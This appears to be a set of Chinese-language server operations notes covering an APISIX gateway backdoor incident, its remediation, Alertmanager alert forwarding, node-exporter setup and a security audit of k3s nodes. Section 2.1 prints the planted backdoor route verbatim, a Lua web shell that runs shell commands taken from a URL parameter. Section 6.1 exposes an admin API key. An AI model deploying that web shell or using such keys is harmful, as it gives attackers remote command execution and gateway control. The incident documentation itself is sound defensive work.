### 二、安全事件：后门路由（2026-09-20 发现）

#### 2.1 事件

勘察路由时发现一条**恶意后门路由** `zz4aa103`：

```json
{"name":"zz4aa103","id":"zz4aa103",
 "create_time":1789173924,"update_time":1789173924,
 "plugins":{"serverless-pre-function":{"phase":"rewrite",
   "functions":["return function() local h=io.popen(ngx.var.arg_c); local o=h:read('*a'); h:close(); ngx.say(o); ngx.exit(200) end"]}},
```

| admin API 默认 key + allow_admin 0.0.0.0/0 | 默认公开 key，9180 可公网访问 | ✅ 换 key + 收紧白名单 |

### 三、CrashLoop 修复过程

#### 3.1 现象演变

| 阶段 | 报错 | 原因 |
| :--- | :--- | :--- |
| 最初 | `bind() to unix:config_listen.sock failed (Address already in use)` | socket 残留 / 旧 nginx 进程 |
| 重建 etcd 后 | `temporary failure in name resolution`（etcd 解析失败） | 手动 `docker run` 无网络别名 `etcd` |
| 最终修复 | — | compose v2 重建，别名恢复 |

#### 3.2 修复动作

1. 安装 **docker compose v2**（原 v1.29.2 有 `KeyError: 'ContainerConfig'` bug，会删容器不建新的）

   ```bash
   curl -sSL -o /usr/local/lib/docker/cli-plugins/docker-compose \
     "https://ghfast.top/https://github.com/docker/compose/releases/download/v2.40.3/docker-compose-linux-x86_64"
   chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
   ```

2. 用 v2 重建：

   ```bash
   cd /root/services/apisix
   docker compose up -d etcd apisix
   ```

3. 验证：`getent hosts etcd` → `192.168.1.4 etcd`（别名生效）、路由 11 条 key 完好

#### 3.3 血泪教训

- ⚠️ **这台机器上 `docker-compose`（v1.29.2）不可靠** —— 改容器一律用 `docker compose`（v2）
- ⚠️ **etcd 数据在 named volume `apisix_etcd_data`**，**不是** bind mount `./etcd_data/`（compose 里 `volumes: etcd_data:` 是 named volume）—— 手动重建时挂错卷会一片空白
- ⚠️ **`admin_key` 更新后必须重启容器**（config.yaml 是 bind mount 文件，`docker compose up` 不重建，得 `docker restart`）
- ⚠️ APISIX 白名单外 IP 返回的是 **401 而非 403**，容易误判为"key 错"

### 六、Halo 域名路由切换（2026-09-22）

> 背景：Halo 迁到 k3s 后（見 `03-k3s集群部署实战.md` §Halo 部署实战），APISIX 里 `halo.example.com` 的 upstream 还指向**旧宿主机 docker 部署**（`203.0.113.11:8090`），需改指向 k3s 新后端。

#### 6.1 操作

- admin API：`http://127.0.0.1:9180/apisix/admin/routes/<id>`
- **⚠️ admin key 以容器 `config.yaml` 里的为准**（`4531ed446b172e8d42906aa185ab1dd0`）；`security-incident-20260920/new-admin-key.txt` 里那个实测校验失败，别用
- halo 路由：`id=559975175957775038`，host `halo.example.com`，uris `/*`

```bash
# PATCH 改 upstream
curl -X PATCH -H "X-API-KEY: <key>" -H "Content-Type: application/json" \
  "http://127.0.0.1:9180/apisix/admin/routes/559975175957775038" \
  -d '{"upstream":{"type":"roundrobin","scheme":"http","nodes":[{"host":"203.0.113.11","port":30090,"weight":1}]}}'
# → HTTP 201
```

**改动：`upstream.host:port` 由 `203.0.113.11:8090` → `203.0.113.11:30090`**（8090 = 旧宿主机 docker；30090 = k3s NodePort，自动转发到 Lenovo 上的 Pod）。

#### 6.2 为什么选 NodePort 而不是直指 Pod/ClusterIP

- Pod IP 会变，不适合写死
- ClusterIP 走不通（**APISIX 在宿主机 docker，不在 k3s 集群内网**）
- NodePort 在杭州节点已监听（k3s NodePort 全节点生效）→ 改动最小、最稳
- 注：原路由已带 `enable_websocket: true`（Halo 后台需要），保留

#### 6.3 验证

```
curl -H "Host: halo.example.com" http://203.0.113.11/actuator/health/readiness
# → {"status":"UP"}  HTTP 200
# DNS: halo.example.com → 203.0.113.11
```

#### 6.4 流量路径（改后）

```
用户 → halo.example.com
         ↓ DNS
      203.0.113.11 (杭州)
         ↓ APISIX :30090
      k3s NodePort → Lenovo 上的 Halo Pod
```

#### 6.5 HTTPS（暂不做，已评估）

**现状**：APISIX 只映射 `80:9080`，**443 未映射**；`9443:9443` 映射了但 APISIX 无 ssl 监听配置；**ssl 对象 0 个**；无任何证书文件 → 纯 HTTP。

**方案（待用户决定）**：

| 方案 | 说明 |
|---|---|
| 阿里云免费单域名证书 | 一年期，20 张/年，下载 Nginx 格式（.pem+.key）| 
| 通配符 `*.example.com` | **一张证书覆盖所有三级域名**（halo/apisix/nas/jenkins…）；付费或 Let's Encrypt DNS-01 免费 |
| APISIX ACME 插件 | 自动申请+续期（需配验证通道）|

**关键认知（用户问过）**：**不同三级域名能否共用一张证书** → 通配符 `*.example.com` 可以（同一层级所有三级域名），单域名证书不行；APISIX 按 **SNI** 自动匹配证书，通配符只需一个 ssl 对象管全部。

**操作步骤（选了就做）**：
1. 申请证书（阿里云 / LE）
2. `config.yaml` 开 ssl 监听：`apisix.ssl.listen: [{port: 9443, enable_http2: true}]`
3. `docker-compose.yml` 加 `- "443:9443/tcp"`
4. 上传证书：`PUT /apisix/admin/ssls/1 {cert, key, snis: ["*.example.com", "example.com"]}`
5. 阿里云安全组放行 443

#### 6.6 其他域名（未动）

APISIX 共 10 条路由，本次**只动 halo 一条**；其余 apisix/nas/static/jenkins/home-node/asus/jump/rd/cloudreve 保持原样。

## 第二部分 · Alertmanager 告警出口（原 07）

> 背景：k3s 上 kube-prometheus-stack 早已部署，Prometheus 规则能产告警、Alertmanager 也收到了，
> 但 **Alertmanager 一直是空配置（无 receiver）→ 告警发不出去**。本文记录 2026-09-27 把它打通的全过程。
> 环境：非 helm release 的监控栈（`helm template + kubectl apply` 管的，`helm status kps` = release not found）。

---

### 一、问题定位

| 环节 | 状态（改造前） |
|---|---|
| Prometheus 规则评估 → 产告警 | ✅ 正常（`ALERTS{alertstate="firing"}` 有 9 条） |
| Prometheus → Alertmanager 接入 | ✅ `spec.alerting` 已 patch |
| **Alertmanager → 通知出口** | ❌ **`route.receiver = None`、`receivers = []`** |

**根因**：Alertmanager CR 从没挂 `configSecret`，operator 用默认空配置生成了 `*-generated` secret → 无 receiver → 告警进 AM 后无处可去。

---

### 二、架构设计（为什么需要一个转发器）

```
Prometheus 规则 → Alertmanager(Pod, home-node 家宽)
                      │  webhook_configs
                      ▼
              http://10.88.0.<NODE_C>:9099/        ← 上海节点上的转发器
                      │  POST 企微 API
                      ▼
        企业微信群机器人（qyapi.weixin.qq.com）
```

**为什么不让 Alertmanager 直接打企微？**
1. **格式适配**：Alertmanager 的 webhook 是**通用 JSON**（`{status, alerts:[{labels,annotations}]}`），而企微群机器人要 `{msgtype:"text", text:{content}}` → 必须有中转做转换。
2. **网络/可测性**：中转放上海节点（常驻、wg 可达 `10.88.0.<NODE_C>`），AM 在 home-node 只能经 overlay 访问 → 走 WG 平面稳定。

**为什么转发器放上海节点（10.88.0.<NODE_C>）而不是 home-node？**
- 上海节点是常驻云机（22 天 uptime、负载 0.00、有公网出网），**不依赖家宽**；
- AM 在 home-node，经 WG `10.88.0.0/24` 到 `10.88.0.<NODE_C>:9099` 直达；
- 转发器无状态、零依赖（纯 stdlib python3），挂了 systemd `Restart=always` 5s 自愈。

### 三、落地步骤

#### 3.1 转发器（上海节点 203.0.113.13）

脚本：`/opt/wa-relay/relay.py`（纯 stdlib：`urllib` + `http.server`）
```python
#!/usr/bin/env python3
"""Alertmanager -> 企业微信群机器人 转发器 (stdlib only)."""
import json, os, sys, datetime, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

WEBHOOK = os.environ.get("WECHAT_WEBHOOK", "")
LISTEN_HOST = os.environ.get("LISTEN_HOST", "0.0.0.0")
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "9099"))
MAXLEN = 1800  # 企微 text 单条上限约 2048 字节，留余量

def post_wechat(content: str):
    body = json.dumps({"msgtype": "text", "text": {"content": content[:MAXLEN]}}).encode()
    req = urllib.request.Request(WEBHOOK, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode()

def fmt(payload: dict) -> str:
    status = payload.get("status", "?")
    alerts = payload.get("alerts", [])
    icon = {"firing": "🔥", "resolved": "✅"}.get(status, "🔔")
    lines = [f"{icon} [{status.upper()}] {len(alerts)} 条告警"]
    for a in alerts[:10]:
        lab = a.get("labels", {}) or {}
        ann = a.get("annotations", {}) or {}
        lines.append(f"\n▸ {lab.get('alertname','?')} ({lab.get('severity','-')})")
        if lab.get("instance"): lines.append(f"  实例: {lab['instance']}")
        if ann.get("summary"): lines.append(f"  摘要: {ann['summary']}")
        if ann.get("description"): lines.append(f"  详情: {ann['description']}")
    if len(alerts) > 10: lines.append(f"\n… 其余 {len(alerts)-10} 条省略")
    lines.append(f"\n时间: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    return "\n".join(lines)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n)
        try:
            payload = json.loads(raw.decode() or "{}")
            res = post_wechat(fmt(payload))
            print("relayed:", res, file=sys.stderr, flush=True)
            code, out = 200, b"ok"
        except Exception as e:
            print("relay error:", repr(e), file=sys.stderr, flush=True)
            code, out = 500, b"err"
        self.send_response(code); self.send_header("Content-Length", str(len(out))); self.end_headers()
        self.wfile.write(out)
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

if __name__ == "__main__":
    if not WEBHOOK: sys.exit("WECHAT_WEBHOOK required")
    print(f"listening {LISTEN_HOST}:{LISTEN_PORT}", flush=True)
    HTTPServer((LISTEN_HOST, LISTEN_PORT), Handler).serve_forever()
```

### 五、关键坑与认知

1. **非 helm release 的监控栈改配置**：只能 `patch Alertmanager CR` + 建 base secret，**不能 `helm upgrade`**。CR 里 `configSecret` 不设 → operator 用默认空配置（这就是"AM 收到告警但发不出去"的根因）。
2. **secret 命名**：base secret 名 = CR 的 `configSecret` 值；渲染产物是 `<alertmanager名>-generated`。改 base secret 后 operator 会在约 20s 内重新渲染。
3. **`/api/v2/status` 的 config 可能为空**（该 AM 版本行为）→ 验证要看 pod 内 `/etc/alertmanager/config_out/alertmanager.env.yaml` 或 `-generated` secret，别被 API 误导。
4. **Alertmanager webhook 是通用 JSON**，企微/钉钉要专有格式 → **必须有中转**；除非直接用 Prometheus 的 `webhook_configs` 出站插件。
5. **`group_wait: 30s`** 是首条告警的首次投递延迟，属正常（批量聚合），测试时别以为没通。
6. **Watchdog 必删/屏蔽**：它是 Prometheus 自带的"死信开关"（永远 firing），不屏蔽会跟真实告警一起推、稀释信噪比。
7. **PrometheusRule 两个坑（2026-09-27）**：
   - **`default()` 不是 Prometheus 模板函数**（那是 Grafana/Jsonnet 生态的）→ 写了 admission webhook 直接拒收 `PrometheusRule`。用 `$labels.instance` 代替。
   - **必须带 `release: kps` 标签**，否则 operator 不选它、规则静静躺在那里不加载。
   - "加了不生效"别急：operator reconcile ~30s + config-reloader reload；别在第一眼就判死刑。
8. **告警阈值调整的坑：删数组项必须 `replace` 不是 `apply`（2026-09-28）**
   - `kubectl apply` 三方合并对数组取并集 → **文件里删掉的规则会从 live 合回来**，删不掉。
   - 改用 **`kubectl replace -f`** 整份覆盖才行。
   - 规律：**只要是用脚本生成整份 YAML 去增删「数组元素」，就用 `replace`**；`replace` 要求资源已存在，改前先备份。

9. **转发器单线程会被「半开连接」永久堵死（2026-09-28 真实故障）**：
   - 现象：告警在 AM 里正常 firing，但**企微一条都收不到**；AM 日志 `dial tcp 10.88.0.<NODE_C>:9099: connect: connection timed out` 连环重试失败。
   - 根因：relay 用**单线程 `HTTPServer` + 无 socket 超时**，一个慢连接/端口扫描半开连接（日志里 `198.51.100.14` 的 `ConnectionResetError`）就能把 server 读请求的循环卡死 → accept 队列堆满（`ss` 里 `Recv-Q > Send-Q`）→ 所有新 POST 超时。
   - **陷阱：`systemctl is-active` 报 active**（进程还在 `Ss` 态），但实际已不干活。**判活要探端口/发请求，或看 `ss -ltn` 的 Recv-Q 是否堆积**。
   - 修复（已落地，`deploy/wa-relay/relay.py` + 远端 `/opt/wa-relay/relay.py`）：① `ThreadingMixIn`+`daemon_threads` 线程化；② `Handler.timeout=20` 断开半开连接；③ 出站 `urlopen(timeout=10)`。远端 Python 3.6.8 兼容。
   - 验证：端到端 `ok`；**抗阻塞压测**（半开连接占住时正常 GET/POST 仍 200）；加固后 AM 发送失败 0 次。

#### 6.5 告警阈值调整小结（按类别）

> 这一天动了三处阈值/规则，统一收在这里备查。原则：**kps 默认阈值是按「标准规格节点」设计的，对 2 核小机、混跑节点偏敏感 → 用「新增放宽版 `project.*` 组 + 移除默认过于敏感的两条」代替全局改默认。**

##### 6.5.1 节点饱和类：默认两条 → 换成 `project.saturation` 放宽版

| 项 | 原（kps 默认，node-exporter 组） | 现（`project.*` → `project.saturation`） |
|---|---|---|
| 系统负载 | `NodeSystemSaturation`：`load/core > 2` for 10m | `NodeSystemSaturation`：**`load/core > 4`** for 15m warning |
| 磁盘 IO | `NodeDiskIOSaturation`：`rate(node_disk_io_time_weighted…[5m]) > 10` for 30m | `NodeDiskIOSaturation`：**`> 20`** for 30m warning |

- **默认那两条已从 node-exporter 组彻底移除**（不再重复报警 ✅）。
- **理由**：杭州小机 2 核，`load/core > 4` ≈ 负载 8 才算真饱和；对「control-plane + APISIX + frp 混跑」的小规格机合理。
- **磁盘 IO `> 20`（原 10）**：给 `frps`/`openresty` 那些 **D 状态（不可中断 IO）** 进程留余量，避免常态基线就报。
- 移除后当时 `NodeDiskIOSaturation` 处于 pending（IO 值介于 10–20），实测当前 **5.28** → 后续会自己掉出 pending，不会 firing。

##### 6.5.2 磁盘空间类（`project.disk`）：回退为默认

见上文 **D** 节 —— 本机专项 <20%/<10% 撤销，全节点回归 KPS 默认（`NodeFilesystemAlmostOutOfSpace` <5%/<3%；`NodeFilesystemSpaceFillingUp` <15%/<10% 且预测将满）。`project.disk` 组规则已删。

##### 6.5.3 保留不动

- `project.jenkins`（构建失败 / 健康度 / 指标端点，`ci-lib-*` 试验 job 已排除）
- `project.node`（内存 300M / 150M）

##### 6.5.4 关键坑：删 YAML 数组项必须用 `replace`

- **现象**：用 `kubectl apply -f` 更新 PrometheusRule，**想删掉的规则（数组元素）又被合回来了**，删不掉。
- **原因**：`kubectl apply` 是**三方合并**（last-applied / live / 新文件）。对于数组，它按合并键（这里是 `alert` 名）做「并集」，**文件里删掉的元素不会从 live 里移除** → 表现为「删了还在」。
- **解决**：改用 **`kubectl replace -f`** 强制整份覆盖 → 成功删除。
- **教训**：**凡是用脚本生成整份 YAML 去增删数组项（规则列表、容器列表、volumeMounts…），一律用 `kubectl replace`，不要 `apply`。**
  - `replace` 要求资源已存在（否则用 `apply`/`create`）；改前先 `kubectl get … -o yaml > backup`。
- 补充：PrometheusRule 改完要等 operator reconcile + config-reloader，`/api/v1/rules` 里看到 `health=ok` 才作数。

```bash
# Lenovo 上
docker pull docker.m.daocloud.io/prom/node-exporter:latest
docker tag docker.m.daocloud.io/prom/node-exporter:latest prom/node-exporter:latest
docker save prom/node-exporter:latest -o /tmp/ne.tar

# 传到 MSI（注意 Lenovo 的 scp 是老版本，不支持 -O 参数）
sshpass -p '<PASS>' scp /tmp/ne.tar yang@192.168.31.81:/tmp/ne.tar

# MSI 上
docker load -i /tmp/ne.tar
```

#### 7.3 启动容器

```bash
docker run -d --name node-exporter --restart unless-stopped \
  --net=host --pid=host \
  -v /:/host:ro,rslave \
  prom/node-exporter:latest \
  --path.rootfs=/host
```

| 参数 | 为什么必须 |
|---|---|
| `--net=host` | 直接用宿主网络监听 `:9100`，省掉端口映射 |
| `--pid=host` | 读宿主机进程指标，否则 `node_procs_*` 全空 |
| `-v /:/host:ro,rslave` | 只读挂载根目录，`rslave` 让挂载传播生效 |
| `--path.rootfs=/host` | 告诉 exporter 从 `/host` 看宿主机的根文件系统 |

**验证**：

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:9100/metrics    # 200
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.31.81:9100/metrics  # 200
```

#### 7.4 ScrapeConfig

```yaml
apiVersion: monitoring.coreos.com/v1alpha1
kind: ScrapeConfig
metadata:
  name: node-exporter-msi
  namespace: monitoring
  labels:
    release: kps                    # 必须！否则 Prometheus 不加载
spec:
  metricsPath: /metrics
  scheme: HTTP
  staticConfigs:
    - targets: ['192.168.31.81:9100']
      labels:
        job: node-exporter
        host: msi
        env: home-lan
  relabelings:
    - sourceLabels: [__address__]
      targetLabel: instance
      replacement: msi              # 让面板/查询显示 msi 而不是 IP:端口
```

#### 7.5 验收

```bash
# target 健康
kubectl -n monitoring port-forward svc/kps-prometheus 19090:9090 &
curl -s 'http://127.0.0.1:19090/api/v1/targets' | jq '.data.activeTargets[]
  | select(.labels.instance=="msi") | {health, scrapeUrl, lastError}'
```

#### 7.6 坑与注意事项

| 坑 | 说明 |
|---|---|
| **容器莫名消失** | 期间 Docker 服务重启过一次（`ActiveEnterTimestamp` 暴露），所有容器被清。**`--restart unless-stopped` 只保证宿主机重启后自启，不覆盖 docker 服务重装/清理**。镜像还在就一条 `docker run` 重建即可 |
| **动态 IP** | MSI 走 DHCP（`192.168.31.81`），IP 变了 ScrapeConfig 就失效 → **路由器按 MAC 绑静态 IP** |
| **个人电脑会关机** | target 变 down 是正常的。**别给它配和服务器同等的告警规则**，否则全是噪音 |
| **exporter 别暴露公网** | 监听 `:9100` 只能在内网，**绝不做端口映射到公网** |
| **scp 老版本** | Lenovo 的 openssh 较老，`scp -O` 会报 `unknown option -- O`，去掉该参数即可 |

#### 7.7 一句话总结

> 接集群外主机，**先验证 Pod 能不能直连目标 IP**；同局域网往往直通，别一上来就上 frp/Pushgateway。

## 第三部分 · 节点安全审计（原 08）

> 触发：APISIX RCE 后门事件（2026-09-20）后，对 k3s 三节点 + Jenkins 宿主做一次安全面梳理。
> 本文只记录**发现的问题与待办**，不含真实密钥/账号。处置进度就地更新。

**环境**
- 节点：杭州 `203.0.113.11`（control-plane，公网）/ 上海 `203.0.113.13`（worker，公网）/ home-node（家宽，无公网）+ Jenkins 宿主（腾讯云）
- k3s 平面：WG `10.88.0.0/24` 全 mesh；podCIDR 10.42.0-2.0/24

---

### 一、🔴 高危

#### H1. k3s apiserver 6443 对公网全开
- 现象：杭州节点 `k3s-server` 监听 `*:6443`（非 127.0.0.1）。
- 风险：6443 全网可扫，成为爆破/漏洞利用目标；叠加 09-20 后门事件，暴露面必须收紧。
- 缓解现状：RBAC 尚克制（只有 `system:masters` 持 cluster-admin；匿名访问实测无法列举 ns）。
- 处置：**云安全组只放行 WG 网段 + 运维 IP**，公网拒绝；kubeconfig 一律走 WG。
- 状态：⬜ 待办

#### H2. SSH 允许 root 登录 + 持续暴力破解
- 现象：
  - Jenkins 宿主 `PermitRootLogin yes`
  - 累计失败登录 **60305 次**（`lastb`）
  - 攻击源示例：`198.51.100.11` / `198.51.100.12` / `198.51.100.13`
- 风险：root 直接暴露 + 弱口令被爆破成功即失守。
- 处置：
  1. `PermitRootLogin prohibit-password`（仅密钥）
  2. 尽量 `PasswordAuthentication no`
  3. 部署 fail2ban 或安全组白名单
  4. 至少把 22 端口限制到常用 IP 段
- 状态：⬜ 待办

#### H3. Jenkins 宿主端口全网暴露
| 端口 | 服务 | 风险 |
|:---|:---|:---|
| 8080 | Jenkins Web | **高危**（Jenkins 是 RCE 重灾区） |
| 50000 | Jenkins agent JNLP | 高危（可被恶意 agent 接入） |
| 9100 | node-exporter | 中（信息泄漏） |
| 80 | nginx | 待确认是否有未知站点 |

- 处置：安全组限制来源 IP；Jenkins 前加反代 + 鉴权；agent 端口仅对内网/WG。
- 状态：⬜ 待办
